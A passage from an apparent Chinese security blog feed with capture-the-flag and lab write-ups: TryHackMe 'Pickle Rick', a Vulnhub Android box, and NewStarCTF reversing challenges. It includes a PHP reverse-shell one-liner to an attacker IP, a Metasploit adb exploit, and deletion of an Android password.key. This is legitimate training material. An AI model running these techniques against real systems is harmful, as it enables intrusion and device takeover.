class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>在格式化后，<code>*</code> 符号之间的间隔会显得更紧凑，意味着优先进行运算，而 <code>+</code> 符号附近的间隔则较大，代表着较后进行运算。</p><h2 id="省略"><a href="#省略" class="headerlink" title="省略"></a>省略</h2><p>在 go 中的 if 和 for 语句可以只写一行，但必须加上花括号</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">func <span class="hljs-selector-tag">main</span>() &#123;<br>for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-selector-tag">i</span>++ &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">i</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h2><p>go 中没有三元表达式，不能写像 c 语言中的 <code>temp = (a &gt; b) ? a : b;</code>  这种表达式。</p>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Pickle Rick</title>
    <link href="/2025/01/15/Rick/"/>
    <url>/2025/01/15/Rick/</url>
    
    <content type="html"><![CDATA[<p>时隔一个半月，我终于活了！</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -T4 -sS -Pn <span class="hljs-number">10.10.85.211</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/cd3fd564cb250a1f.png"></p><p>开放了 <code>22/tcp ssh服务</code>  和 <code>80/tcp http服务</code> </p><p>访问一下网页 <code>10.10.85.211:80</code>，好像并没有什么有用信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/fcd52b11d2a9dc4f.png"></p><p>emmm…f12 一下，发现了 <code>Username：R1ckRul3s</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/8e199542379a914d.png"></p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>然后再扫一下目录吧</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//10.10.85.211/</span><br></code></pre></td></tr></table></figure><p>扫到了几个看起来挺有用的目录，一个一个访问一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[01:23:50]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">313</span>B  - /assets  -&gt;  http:<span class="hljs-comment">//10.10.85.211/assets/</span><br><span class="hljs-selector-attr">[01:23:50]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">588</span>B  - /assets/<br><span class="hljs-selector-attr">[01:24:39]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">455</span>B  - /login<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[01:25:10]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">17</span>B  - /robots.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6c25fc2caf1164eb.png"></p><p>首先是 <code>robots.txt</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5238ec11e7dc36f5.png"></p><p>一串字符串，不知道有没有用但也先收集着</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Wubbalubbadubdub</span><br></code></pre></td></tr></table></figure><p>访问一下 <code>login.php</code>，用户名和密码，把之前发现的 <code>R1ckRul3s</code> 和那串奇怪的字符串填进去，发现成功了</p><p><img src="https://img.dkdun.cn/v1/2025/12/c568a7a5f6d0b782.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/16fb5a5e82e320f8.png"></p><h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p>在 <code>Command Panel</code> 执行 <code>ls</code>，得到了如下结果，一堆目录和文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Sup3rS3cretPickl3Ingred<span class="hljs-selector-class">.txt</span><br>assets<br>clue<span class="hljs-selector-class">.txt</span><br>denied<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.html</span><br>login<span class="hljs-selector-class">.php</span><br>portal<span class="hljs-selector-class">.php</span><br>robots.txt<br></code></pre></td></tr></table></figure><p>cat 不行但是 tac 可以，输入 tac 可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tac</span> Sup3rS3cretPickl3Ingred.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a40d69c3151dda0c.png"></p><p>得到了第一个 flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">mr. meeseek hair<br></code></pre></td></tr></table></figure><h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p>之前 <code>ls</code> 显示出来的文件中有一个名为 <code>clue.txt</code> 的文件，中文意思是 “线索”，查看一下</p><p><img src="https://img.dkdun.cn/v1/2025/12/18ee2ed196878302.png"></p><p>意思是 “在文件系统中寻找其他成分。” </p><p>看来得在系统中寻找，那来反弹 shell 一下</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;10.21.118.213&quot;</span>,<span class="hljs-number">6667</span>);<span class="hljs-variable">$proc</span>=proc_open(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">1</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">2</span>=&gt;<span class="hljs-variable">$sock</span>),<span class="hljs-variable">$pipes</span>);&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure><p>这里有一个小插曲，因为我用的 wsl，反弹 shell 的时候在 wsl 的 kali 上监听了很多次，但是都没有回显，搞了好几个小时，最后终于破防，在凌晨三点求助于 n0o0b 师傅，师傅让我在 Windows 本机上进行 nc 监听，对了！这次成了，终于！特别特别感谢 n0o0b 师傅 zwz！！！</p><p><img src="https://img.dkdun.cn/v1/2025/12/c358e20f23b37553.png"></p><p>然后根据自己的流程找出第二个 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/80331b77365a4f56.png"></p><p>第二个 flag</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">jerry tear</span><br></code></pre></td></tr></table></figure><h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p>本来我想着拿到 shell 了，进 root 看看，但是忘记开始看的时候好像是 www-data 权限，权限不够</p><p><img src="https://img.dkdun.cn/v1/2025/12/fc4fa2fcbbe0bad6.png"></p><p>那试试 <code>sudo -l</code> 列出目前用户可执行与无法执行的指令，发现可以通过 sudo 免密码使用 root（狂喜）</p><p>直接使用 <code>sudo su</code> 进入</p><p><img src="https://img.dkdun.cn/v1/2025/12/66849ce6212ea5d3.png"></p><p>第三个 flag</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fleeb juice</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-Android4:1</title>
    <link href="/2024/11/30/Vulnhub-Android4-1/"/>
    <url>/2024/11/30/Vulnhub-Android4-1/</url>
    
    <content type="html"><![CDATA[<p>通过查找资料，又学习到了一些东西，我心甚慰，喜欢这样的自己 ：）</p><span id="more"></span><p>初学者</p><p>攻击机 kali：192.168.88.138</p><p>靶机：192.168.88.140</p><p><img src="https://img.dkdun.cn/v1/2024/12/01aaf50efc271d05.png"></p><p>扫描网段，发现主机 192.168.88.140</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.88.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/b114f4a2a3bd2d98.png"></p><p>查看开放端口</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> -sV -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">192.168</span>.<span class="hljs-number">88.140</span><br></code></pre></td></tr></table></figure><p>可以看到目标开放了 3 个端口，分别是 5555、8080、22000，先看看 8080 吧</p><p><img src="https://img.dkdun.cn/v1/2024/12/c8b2c3645dec92a9.png"></p><p>页面提示说有后门，用 POST 方式提交</p><p><img src="https://img.dkdun.cn/v1/2024/12/533c79a56b1a35bb.png"></p><p>用 dirb 扫描一下目录，扫出来了 <code>backdoor.php</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/48095127f1dcb6bc.png"></p><p>看来是个假的后门，没用。。。</p><p><img src="https://img.dkdun.cn/v1/2024/12/a03c6db318dad930.png"></p><p>PHP CLI 和 DropBear 也没什么结果，那么看看 5555 端口，搜了一下是指 android 服务默认的监听端口，通常与一些设备管理和远程访问服务相关联，特别是 adb 服务默认使用这个端口</p><p>简单介绍一下 adb：Android Debug Bridge（安卓调试桥），它就是一个命令行工具，用于通过电脑端与模拟器或者是设备之间的交互。</p><p>用 msf 来搜索一下 adb 漏洞，找到一个远程命令执行漏洞</p><p><img src="https://img.dkdun.cn/v1/2024/12/921633b6f851291e.png"></p><p>调用模块，然后进行利用</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/android/adb/adb_server_exec<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> RHOSTS 192.168.88.138 （目标IP）<br><span class="hljs-built_in">set</span> LHOST 192.168.88.140 （本机IP）<br><span class="hljs-built_in">run</span> <br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/52fb8adc6fe57576.png"></p><p>adb 连接，直接 getshell</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">adb</span> <span class="hljs-number">192.168.88.140</span><br>adb shell<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/2f0c334bc0eefed1.png"></p><p>但是是普通权限，那么直接 <code>su</code> 进入 root 权限</p><p><img src="https://img.dkdun.cn/v1/2024/12/12e806c87ee042bd.png"></p><p>列出当前路径下的文件，访问 <code>data</code> 目录（Android 中重要的存储数据的目录，存储着用户的所有程序相关数据），发现有 root，进入得到 flag</p><p><img src="https://img.dkdun.cn/v1/2024/12/a11f4b548e67a0b2.png"></p><p>得到</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">flag:</span> ANDROID&#123;u_GOT_root_buddy&#125;<br></code></pre></td></tr></table></figure><p>来都来了，尝试着破解一下密码，进入</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/<span class="hljs-class"><span class="hljs-keyword">data</span>/system/</span><br></code></pre></td></tr></table></figure><p>发现了 <code>password.key</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/f844809cb8685583.png"></p><p>使用最朴素的破解办法，那就是 —- 直接给他删了（嘻嘻）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> password.key<br></code></pre></td></tr></table></figure><p>删除之后打开靶机界面，直接 enter 就解锁了</p><p><img src="https://img.dkdun.cn/v1/2024/12/b192013003c50db4.png"></p><p>通过查找资料，又学习到了一些东西，我心甚慰，喜欢这样的自己 ：）</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week3</title>
    <link href="/2024/11/29/Week3/"/>
    <url>/2024/11/29/Week3/</url>
    
    <content type="html"><![CDATA[<p>不行，我好菜啊TT</p><p>更一下，自由支配的时间好少（</p><p>时隔半个多月，我终于小有时间更新了！！！</p><span id="more"></span><h1 id="simpleAndroid"><a href="#simpleAndroid" class="headerlink" title="simpleAndroid"></a>simpleAndroid</h1><p>按照老方法看 <code>.xml</code> 里 的 <code>activity</code> 内容找主函数</p><p>经过 <code>CheckRoot.check()</code> 判断后将正确结果返回，然后跳转到 <code>CheckActivity</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/71863c1f53ad4f50.png"></p><p>用 <code>isValidInput()</code> 来输入的格式进行检测，长度必须为 24 ，形式以 <code>flag&#123;</code> 开头 <code>&#125;</code> 结尾，然后通过 <code>CheckData</code> 来进行比较</p><p>可以看到一个熟悉的 <code>native</code>，说明这个方法属于 <code>native</code> 层，需要去逆 <code>so</code> 文件了</p><p><img src="https://img.dkdun.cn/v1/2024/12/514232c5e71d14b0.png"></p><p>看了下 wp 居然可以直接改后缀为 <code>.zip</code> 找 <code>so</code> 文件！！！那所有 apk 文件都可以吗？！下次遇到试试这样走捷径(bushi)</p><p>搜索 <code>CheckData</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2024/12/ec471833977c7734.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">  Class = _JNIEnv::FindClass(a1, <span class="hljs-string">&quot;com/example/simpleandroid/UseLess&quot;</span>);<br><span class="hljs-comment">//寻找 Java 的 UseLess 类</span><br>  StaticFieldID = _JNIEnv::GetStaticFieldID(a1, Class, <span class="hljs-string">&quot;CHAR_DATA&quot;</span>, <span class="hljs-string">&quot;Ljava/lang/String;&quot;</span>);<br><span class="hljs-comment">//通过 GetStaticFieldID 获取到了字段 CHAR_DATA 的 jfileID </span><br>  v27 = _JNIEnv::NewStringUTF(a1, <span class="hljs-string">&quot;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/A&quot;</span>);<br><span class="hljs-comment">//创建的新的 jString 类型字符串</span><br>  _JNIEnv::SetStaticObjectField(a1, Class, StaticFieldID, v27);<br><span class="hljs-comment">//通过 SetStaticObjectField 把 v27 赋值给 Java 的 CHAR_DATA 字段</span><br><span class="hljs-comment">//修改了 Java 层的 UseLess 的 CHAR_DATA 字段</span><br><br>  StaticMethodID = _JNIEnv::GetStaticMethodID(a1, Class, <span class="hljs-string">&quot;func&quot;</span>, <span class="hljs-string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span>);<br><span class="hljs-comment">//获取 Java 层函数 func 的 jmethodID </span><br>  v9 = <span class="hljs-number">0</span>;<br>  v25 = _JNIEnv::CallStaticObjectMethod((_DWORD)a1, Class, StaticMethodID, v30, v3, v4, v7[<span class="hljs-number">0</span>]);<br><span class="hljs-comment">//通过 CallStaticObjectMethod 将输入的 v30 传入 func 函数 </span><br>  StringUTFChars = _JNIEnv::GetStringUTFChars(a1, v25, <span class="hljs-number">0LL</span>);<br><span class="hljs-comment">//将上面函数调用的返回值赋给了 StringUTFChars</span><br><span class="hljs-comment">//把输入作为参数传给了 Java 层的 func 函数，得到返回值</span><br></code></pre></td></tr></table></figure><p>回到 jad-gui 看 <code>UseLess</code> 类，流程可以看出来进行 Base64 的变换，因为 <code>so</code> 对于 <code>CHAR_DATA</code> 进行了更改，所以这里是一个换表的 Base64</p><p><img src="https://img.dkdun.cn/v1/2024/12/f4fb59bd9b159a1a.png"></p><p>输入首先经过换表 Base64 的变化，进入 <code>so</code> 加密。首先前后交换位置，再进行循环右移 4 位的操作，最后和<code>data_1</code> 进行比较。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs smali">v35 = StringUTFChars;//base64 的结果赋值<br>v34 = -1<span class="hljs-class">LL;</span><br>v23 = __strlen_chk(StringUTFChars, -1<span class="hljs-class">LL);</span><br>v10 = v23;<br>v22 = v7;<br>v11 = &amp;v7[-((v23 + 15<span class="hljs-class">LL) &amp; 0xFFFFFFFFFFFFFFF0LL)];</span><br>v21 = v23;<br>for ( i = 0; i &lt; (int)v23; ++i )<br>  v11[i] = *(_BYTE *)(StringUTFChars + i);<br>for ( j = 0; ; ++j )<br>&#123;<br>  v8 = j;<br> <span class="hljs-built_in"> if </span>( j &gt;= (int)v23 / 2 )<br>    break;<br>  v5 = v11;<br>  v18 = v11[j];<br>  v11[j] = v11[v23 - j - 1];<br>  v5[v23 - j - 1] = v18;//将 v11[j] 和 v11[v23-j-1] 交换位置<br>&#125;<br>v17 = v11;<br>v16 = v11;<br>v15 = &amp;v11[v10];<br>while ( v16 != v15 )<br>&#123;<br>  v14 = v16;<br>  *v16 = ((int)(unsigned __int8)*v16 &gt;&gt; 4) | (16 * *v16);//循环右移 4 位<br>  ++v16;<br>&#125;<br>for ( k = 0; k &lt; (int)v23; ++k )<br>&#123;<br> <span class="hljs-built_in"> if </span>( (unsigned __int8)v11[k] != data_1[k] )<br>  &#123;<br>    v33 = 0;<br>    v12 = 1;<br>   <span class="hljs-built_in"> return </span>v33;<br>  &#125;<br>&#125;<br>v33 = 1;<br>v12 = 1;<span class="hljs-built_in"></span><br><span class="hljs-built_in">return </span>v33;<br></code></pre></td></tr></table></figure><p>所以逆向流程就是：循环移动 -&gt; 交换位置 -&gt; base64</p><p>将 <code>data_1</code> 数据提取出来</p><p><img src="https://img.dkdun.cn/v1/2024/12/cfa0a4036c1e3ed4.png"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>result = <span class="hljs-string">&quot;&quot;</span><br>enc = [<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF4</span>,<br>       <span class="hljs-number">0x43</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x36</span>,<br>       <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x97</span>,<br>       <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x16</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] = (enc[i] &lt;&lt; <span class="hljs-number">4</span> | enc[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)//<span class="hljs-number">2</span>):<br>    tmp = enc[i]<br>    enc[i] = enc[<span class="hljs-built_in">len</span>(enc) - i - <span class="hljs-number">1</span>]<br>    enc[<span class="hljs-built_in">len</span>(enc) - i - <span class="hljs-number">1</span>] = tmp<br><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> enc])<br>CHAR_DATA = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>NewStringUTF = <span class="hljs-string">&quot;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/A&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64decode(result.translate(<span class="hljs-built_in">str</span>.maketrans(NewStringUTF, CHAR_DATA))))<br><br>&gt;&gt;<span class="hljs-string">b&#x27;flag&#123;android_is_simple!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="SecertsOfKawaii"><a href="#SecertsOfKawaii" class="headerlink" title="SecertsOfKawaii"></a>SecertsOfKawaii</h1><p>查看 <code>MainActivity</code> 代码，看起来好像被混淆了，乱乱的</p><p><img src="https://img.dkdun.cn/v1/2024/12/8d9abae0ff32d920.png"></p><p>可以使用 jeb 去混淆，解析成 Java 代码（怎么这些工具这么强啊啊啊啊）</p><p><img src="https://img.dkdun.cn/v1/2024/12/996d02236c2e81ab.png"></p><p>往下看代码流程，Java 层有一个 <code>RC4</code> 加密，<code>key</code>是 <code>rc4k4y</code>，加密后 <code>Base64</code> 一下传到 <code>so</code> 层，值在 <code>so</code> 层检查</p><p><img src="https://img.dkdun.cn/v1/2024/12/e545a4d1493aea08.png"></p><p><code>so</code> 文件有壳（以后都会记住要先查壳了），脱壳查看</p><p><img src="https://img.dkdun.cn/v1/2024/12/ce34a0c04606ef30.png"></p><p>xxtea（讨厌 tea 系列！！！），密钥是 <code>meow~meow~tea~~~</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/7dfbf02378d099da.png"></p><p>所以整个流程就是： xxtea -&gt; base64 -&gt; rc4 </p><p> 写 exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">uint32_t</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0xdeadbeef</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="hljs-string">&lt;&lt; 3) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 2)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sbox[<span class="hljs-number">257</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-comment">//初始化 s 盒</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_sbox</span><span class="hljs-params">(<span class="hljs-type">char</span> *key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> 